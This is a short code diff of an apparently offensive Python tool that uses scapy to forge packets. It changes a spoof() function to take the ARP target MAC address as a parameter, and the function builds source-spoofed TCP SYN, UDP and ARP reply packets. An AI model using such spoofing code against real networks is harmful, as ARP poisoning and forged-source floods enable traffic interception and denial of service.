@@ -10,14 +10,14 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
   
-def spoof(target_ip, spoof_ip, protocol, packet_amount):
+def spoof(target_ip, spoof_ip, protocol, mac_address, packet_amount):
     src_port = random.randint(1024, 65535)  
     packet = None 
     try:
         if(protocol == "TCP/IP"):
             packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.TCP(sport = src_port, dport = 80, flags='S')
         elif(protocol == "ARP"):
-            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "4d:cc:6a:4b:8d:b0", psrc = spoof_ip)
+            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = mac_address, psrc = spoof_ip)
         elif(protocol == "UDP"):
             packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.UDP(sport = src_port, dport = 53)
         elif(protocol == "ICMP"):
